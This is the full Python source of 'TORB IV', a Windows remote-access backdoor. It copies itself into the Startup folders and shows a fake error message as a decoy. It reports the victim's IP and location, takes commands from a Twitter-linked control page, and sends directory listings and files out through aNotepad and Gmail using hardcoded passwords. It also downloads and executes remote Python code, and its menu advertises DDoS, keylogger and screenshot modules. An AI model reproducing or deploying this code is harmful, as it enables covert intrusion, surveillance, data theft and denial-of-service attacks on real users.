#  _______  _______  ______    _______        ___   __   __ 
# |       ||       ||    _ |  |  _    |      |   | |  | |  |
# |_     _||   _   ||   | ||  | |_|   |      |   | |  |_|  |
#   |   |  |  | |  ||   |_||_ |       |      |   | |       |
#   |   |  |  |_|  ||    __  ||  _   |       |   | |       |
#   |   |  |       ||   |  | || |_|   |      |   |  |     | 
#   |___|  |_______||___|  |_||_______|      |___|   |___|  
#

# =====================================
# ============== Modules ==============
import requests
import ctypes
from ctypes import *
import sys
import os
import pyHook, pythoncom, sys, logging
import webbrowser
import wmi
import random
import shutil
import subprocess
import urllib
import urllib2
import time
import threading
import socket
import string
import wx
import smtplib
import datetime
from bs4 import BeautifulSoup

from shutil import copyfile
from win32com.shell import shell, shellcon

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from threading import Thread
from urllib import urlopen
from atexit import register
from os import _exit
from sys import stdout, argv

# File Info
cpaf = sys.argv[0]

# =====================================
# ========== Startup Config ===========
startup1 = shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[0], None, 0)
startup2 = shell.SHGetFolderPath(0, (shellcon.CSIDL_STARTUP, shellcon.CSIDL_COMMON_STARTUP)[1], None, 0)
startup1 = startup1 + "\\PRBA.exe"
startup2 = startup2 + "\\PRBB.exe"

# =====================================
# =========== Configuration ===========
# (A)
gmail_user = 'rageangermadness@gmail.com'
gmail_password = 'kirbySock!~'
to = ['pyhannahmaple@gmail.com']
# (B)
cntrlPanel = 'https://wayne.cool/tweet.php'
anotepadUser = 'pyhannahmaple@gmail.com'
anotepadPass = 'aquabat123'

# =====================================
# ========= Global Variables ==========
q = 0
inc = 0
OSFingerprint = os.environ['COMPUTERNAME']
OSSelect = "all"
kslv = False
anoteToggle = False
RemoteIP = '127.0.0.1'
currentTime = datetime.datetime.now()
dateStamp = currentTime.strftime("%Y/%m/%d")
timeStamp = currentTime.strftime("%H:%M:%S")
# =====================================

# Function: Secondary MessageBox function
def MessageBox(title, text, style):
    sty = int(style) + 4096
    return windll.user32.MessageBoxA(0, text, title, sty) #MB_SYSTEMMODAL==4096

# Function: aNotepad.com Submission
def asubmit(subjNote):
	global login_URL
	global page
	global landing
	global keyword
	global inc

	comm_append = ''

	for comm_i in subjNote:
		comm_append = comm_append + comm_i

	login_URL = 'https://anotepad.com/create_account'
	landing = 'https://anotepad.com/'
	keyword = 'Logout'

	note_title = "[%s] - %s" % (str(inc), OSFingerprint)
	note_description = comm_append
	creationLink = 'https://anotepad.com/note/create'

	inc = inc + 1

	print (subjNote)

	with requests.Session() as c:
	
		login_data = \
		{
			'action': 'login',
			'email': anotepadUser,
			'password': anotepadPass,
			'submit':'' 
		}

		create_form = \
		{
			'notetype': 'PlainText',
			'noteaccess': '1',
			'notepassword':'',
			'notequickedit': 'false',
			'notequickeditpassword':'', 
			'notetitle': note_title,
			'notecontent': note_description
		}

		header_data = \
		{
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Cache-Control': 'max-age=0',
			'Connection': 'keep-alive',
			'Content-Length': '73',
			'Content-Type': 'application/x-www-form-urlencoded',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; _gat=1; __atuvc=7%7C11; __atuvs=5aa6da6b2e4908e9006',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/create_account',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36'
		}

		header_create = \
		{
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Connection': 'keep-alive',
			'Content-Length': '172',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie': 'ASP.NET_SessionId=rku3vcoj1s5nydlicq20ww1t; _ga=GA1.2.1863299564.1520884326; _gid=GA1.2.2075336709.1520884326; uvts=7F3tp9k4KUrGKngS; Anotepad=645503E71D3DEB85AF8F469D7A8227A738E907F75816F05B37A18CFF114F39E92911FCFD29D898D34D4AD800E30F703B4E7460AF5FF83767A4D6F63DE0DE2D59444CB25286F7CE7534815FA04973D2F3C81749DB58EFEDE0BC7A1FD2D3FF6E1FE81665BF6CE882BDA6B10B929BF6F044; _gat=1; __atuvc=41%7C11; __atuvs=5aa6da6b2e4908e9028',
			'Host': 'anotepad.com',
			'Origin': 'https://anotepad.com',
			'Referer': 'https://anotepad.com/',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36',
			'X-Requested-With': 'XMLHttpRequest'
		}

		c.get(login_URL)
		c.post(login_URL, data=login_data, headers=header_data)

		asubmit.page = c.get(landing)
		Check = asubmit.page.content.find(keyword)

		if Check == -1:
			print ('\n - aNotepad login failed, but possible submission still sucessful!')
		else:
			print ('\n - aNotepad Successful login + submission')

		c.post(creationLink, data=create_form, headers=header_create)

# Function: Find Command in Twitter Source Code
def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

# Function: Find Current Time and Date
def timeScan():
	currentTime = datetime.datetime.now()
	dateStamp = currentTime.strftime("%Y/%m/%d")
	timeStamp = currentTime.strftime("%H:%M:%S")
	return "Date: %s\nTime: %s" % (dateStamp,timeStamp)

# -------------------------------------------------------------------------------------
# -------------------------------- Directory Scanning ---------------------------------

# Function: Scan Directory
def ScanDir(selDir):
	global to
	global OSFingerprint
	global currentTime
	global dateStamp
	global timeStamp

	stampInclude = timeScan()

	try:
		print ("\nScanning Directory: %s..." % (selDir))
		prepDir = "Agent: TORB IV\nMachine: %s\n%s\n\nScanned Directory (%s):\n" % (OSFingerprint,stampInclude,selDir)
		dirCollect = os.listdir(selDir)
		for dirScan in dirCollect:
			a = '[/ ] - ' + dirScan
			prepDir = prepDir + "\n%s" % (a)
		asubmit("\n" + prepDir)
	except:
		asubmit("\n[%s] - Directory scan failed." % (OSFingerprint))
		print ("Directory Scan Error")

# -------------------------------------------------------------------------------------
# --------------------------------- Download / Upload ---------------------------------

# Function: File Downloader 2
def DownloadF(takeMe):
	global gmail_user
	global to
	global gmail_password
	global usrHandle
	global envoDr

	fileNameVar = random.randint(10000,99999)

	subject = 'TORB IV File Download'

	msg = MIMEMultipart()
	msg['From'] = gmail_user
	msg['To'] = to[0]
	msg['Subject'] = subject

	body = 'TORB IV has delivered your file:'
	msg.attach(MIMEText(body,'plain'))

	filename ='%s' % (fileNameVar)
	attachment = open(takeMe,'rb')

	part = MIMEBase('application','octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition',"attachment; filename= "+filename)

	msg.attach(part)
	text = msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(gmail_user,gmail_password)

	server.sendmail(gmail_user,to,text)
	server.quit()

# Function: File Uploader (Example: http://24.62.122.257/key.py)
def upload(fileUp):
	(fn,hd) = urllib.urlretrieve(fileUp)
	# Execute Python Code (Remote Code Injection)
	execfile(fn)
	#asubmit("\nFile [%s] uploaded and executed successfully." % (fileUp))

# -------------------------------------------------------------------------------------
# -------------------------------------------------------------------------------------

# Function: Prevent Multiple Instances
def singleScriptInstance():
	try:  
	    os.unlink('log')  
	    fd=os.open("log", os.O_CREAT|os.O_EXCL)  
	except:  
	    try: fd=os.open("log", os.O_CREAT|os.O_EXCL)  
	    except:  
	        print ("Another instance detected..."  )
	        sys.exit()

# Function: Msg Load Checker
def msgLoad():
	msgChecker = sys.argv[0][:-3]
	if "PRBA" in msgChecker or "PRBB" in msgChecker:
		pass
	else:
		ctypes.windll.user32.MessageBoxA(0, "An unexpected error has occurred on the execution of this file.", "Error", 0x10) # Display Load Error

# Function: Startup
def startupRoutine():
	global startup1
	global startup2
	global cpaf

	try:
		copyfile(cpaf, startup1)
		copyfile(cpaf, startup2)
	except:
		print ("\nPermission Error\n")

# Function: Get information
def WhoAreThey():
	global RemoteIPAddr
	global CountryInfo
	global RegionInfo
	global CityInfo
	global GPSCoordInfo
	global TimezoneInfo
	global currentTime
	global dateStamp
	global timeStamp

	stampInclude = timeScan()

	wmip = requests.get('https://whatsmyip.com/')
	RemoteIPAddr = find_between(wmip.content,'IP: <span class="pull-right">','</span>')
	CountryInfo = find_between(wmip.content,'Country: <span class="pull-right ">','</span>')
	RegionInfo = find_between(wmip.content,'Region: <span class="pull-right ">','</span>')
	CityInfo = find_between(wmip.content,'City: <span class="pull-right ">','</span>')
	GPSCoordInfo = find_between(wmip.content,'Lati/Long: <span class="pull-right ">','</span>')
	TimezoneInfo = find_between(wmip.content,'Timezone: <span class="pull-right ">','</span>')

	asubmit("""Agent: TORB IV
Machine: %s
%s

Status: Connected

IP Address: %s
Country: %s
Region: %s
City: %s
GPS Coors: %s
Timezone: %s

Base Commands :
	download [dir]
 	upload [url/file.py]

Extra Commands : 
 	sleep
 	echo.all
 	enable.out
  	disable.out
 	select.os [os name] or 'all'
 	msg [message]
 	scandir [dir]
 	teleport [url]

RCI Modules :
 	HTTP DDos [url/ddos.py]
 	UDP DDoS [url/udp.py]
 	Keylogger [url/keylogger.py]
 	processes [url/processes.py]
 	screenshot [url/screengrab.py]

DDoS Config :
  - HTTP Canon:
 	[1] - dscope [target]
 	[2] - dreq [500-99999]
 	[3] - upload [host/ddos.py]

  - UDP Canon :
  	[1] - remoteIP [IP Address]
  	[2] - portnum [port number]
  	[3] - dudp [UDP duration] (Seconds)
  	[4] - upload [host/udp.py]
 
 Use your Twitter account to tweet commands and control your target(s).

 Your Twitter Controller: %s

 [ Software by Pythogen - 2018 ]""" % (OSFingerprint,stampInclude,RemoteIPAddr,CountryInfo,RegionInfo,CityInfo,GPSCoordInfo,TimezoneInfo,cntrlPanel))

# Function: Main / Command Listening
def CMDCheck():
	global q
	global hooks_manager
	global kslv
	global OSFingerprint
	global OSSelect
	global dTarg
	global dRequests
	global udpDuration
	global RemoteIP
	global portNum
	global anoteToggle
	global to

	try:
		r = requests.get(cntrlPanel)
		x = r.content
		z = find_between(x,"<p>","</p>")
	except:
		pass

	if q == z:
		pass

	elif q != z:

		# -------- Message Box --------
		# Example: msg Hello World
		#------------------------------
		if "msg" in z: 
			b = z[4:]
			print ("\nAlert sent!")
			try:
				if anoteToggle == True:
					asubmit("\n[%s] - MessageBox - Sent Successfully" % (OSFingerprint))
				MessageBox('TORB IV', b, 64)
				if anoteToggle == True:
					asubmit("\n[%s] - MessageBox - OK Pressed" % (OSFingerprint))
			except:
				if anoteToggle == True:
					asubmit("\n[%s] - MessageBox - Feature Failed" % (OSFingerprint))
			q = z

		# --- Directory Management ---
		# Example: scandir C:/
		# -----------------------------
		elif "scandir" in z:
			b = z[8:]
			ScanDir(b)
			q = z

		# ------ Web Browser Navigation ---------
		# Example: teleport http://youtube.com/
		# ---------------------------------------
		elif "teleport" in z:
			c = find_between(z,'_blank" title="','" ><span class="')
			print ("\nNavigating to URL")
			print (c)
			try:
				webbrowser.open(c)
				if anoteToggle == True:
					asubmit("\n[%s] - Teleport - Redirection Successful" % (OSFingerprint))
			except:
				if anoteToggle == True:
					asubmit("\n[%s] - Teleport - Redirection Failed" % (OSFingerprint))
			q = z

		# -------- Download File --------
		# example: download C:/file.txt
		# -------------------------------
		elif "download" in z:
			b = z[9:]
			try:
				DownloadF(b)
				if anoteToggle == True:
					asubmit("\n[%s] - File Received\n\nDownload From: %s" % (OSFingerprint,to[0]))
			except:
				if anoteToggle == True:
					asubmit("\n[%s] - File Download - Failed" % (OSFingerprint))
				print ("\nError downloading file.")
			q = z

		# ----------- Upload File -----------
		# example: upload server/key.py
		# -----------------------------------
		elif "upload" in z:
			b = z[7:]
			print(b)
			try:
				upload(b)
			except Exception:
				if anoteToggle == True:
					asubmit("\n[%s] - File Upload - Failed\n\nHint: Remember to issue 'dscope' command first for DDoS!\n" % (OSFingerprint))
				
				print ("\nError uploading file.")
				print ("Error: %s" % (e))
			q = z

		# ---------- Stress Target ----------
		# example: dscope http://bing.com/
		# -----------------------------------
		elif "dscope" in z:
			b = z[7:]
			# Filter URL / Set Target
			dTarg = find_between(b,'data-expanded-url="','" class')
			if anoteToggle == True:
				asubmit("\n[%s] - DDoS Target Set to: %s" % (OSFingerprint, dTarg))
			print ("\nTarget set to %s" % (dTarg))
			q = z

		# ---------- Set Requests -----------
		# example: dreq 5000
		# -----------------------------------
		elif "dreq" in z:
			b = z[5:]
			dRequests = b
			if anoteToggle == True:
				asubmit("\n[%s] - DDoS Requests Set to: %s" % (OSFingerprint, dRequests))
			print ("\nDDoS requests set to %s" % (dRequests))
			q = z

		elif "dudp" in z:
			b = z[5:]
			udpDuration = b
			if anoteToggle == True:
				asubmit("\n[%s] - UDP Duration Set to: %s" % (OSFingerprint, udpDuration))
			print ("\nUDP duration set to %s" % (udpDuration))
			q = z

		# -------- Set Download Host --------
		# example: remoteIP 24.88.178.14
		# -----------------------------------
		elif "remoteIP" in z:
			b = z[9:]
			RemoteIP = b
			if anoteToggle == True:
				asubmit("\n[%s] - Remote IP Set to: %s" % (OSFingerprint, RemoteIP))
			print("\nRemote IP set to %s" % (RemoteIP))
			q = z

		# -------- Set Network Port ---------
		# example: portnum 80
		# -----------------------------------
		elif "portnum" in z:
			b = z[8:]
			portNum = b
			if anoteToggle == True:
				asubmit("\n[%s] - Network Port Set to: %s" % (OSFingerprint, portNum))
			print ("\nRemote port set to %s" % (portNum))
			q = z

		# --------- Echo all Hosts ----------
		# example: echo.all
		# -----------------------------------
		elif z == "echo.all":
			print ("\nAll servers echo back to controller")
			WhoAreThey()
			q = z

		# --------- Enable Output ----------
		# example: enable.out
		# -----------------------------------
		elif z == "enable.out":
			anoteToggle = True
			asubmit("\n[%s] - aNotepad output enabled" % (OSFingerprint))
			q = z

		# --------- Disable Output ----------
		# example: disable.out
		# -----------------------------------
		elif z == "disable.out":
			anoteToggle = False
			asubmit("\n[%s] - aNotepad output disabled" % (OSFingerprint))
			q = z

		# ------- Backdoor Sleep Mode -------
		# The backdoor's idle state
		# -----------------------------------
		elif z == "sleep":
			print ("\nEntering sleep state...")
			if anoteToggle == True:
				asubmit("\n[%s] - Server in Sleep Mode" % (OSFingerprint))
			q = z
		else:
			pass

def OSCheck():
	global q
	global OSFingerprint
	global OSSelect

	try:
		r = requests.get(cntrlPanel)
		x = r.content
		z = find_between(x,'css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0','</span>')
	except:
		pass

	if q == z:
		pass

	elif q != z:

		# ----------- Specify OS ------------
		# example: select.os MarkHallPC
		# -----------------------------------
		if "select.os" in z:
			b = z[10:]
			OSSelect = b
			print ("\nSpecific OS selected: %s" % (b))
			if anoteToggle == True:
				asubmit("\n[%s] - OS Selected: %s" % (OSFingerprint, OSSelect))
			q = z
		else:
			pass

# Script_Load - Execution Events

# (1) Check Instance
singleScriptInstance()

# (2) Call Startup Routine
startupRoutine()

# (3) Grab Information
WhoAreThey()

# (4) Execution Message
msgLoad()

# (4) Activate TORB IV
while(kslv==False):
	time.sleep(5)
	try:

		# A) Continuously check OS selection specification without condition
		OSCheck()

		# B) If OS selection set to Global
		if(OSSelect=="all"):
			CMDCheck()

		# C) If OS selection not set to Global...
		else:

			# D) If OS selection specification viable
			if(OSSelect==OSFingerprint):
				CMDCheck()

			# E) If there's no active PC with specified name
			else:
				pass
	except:
		# F) Connection Error
		pass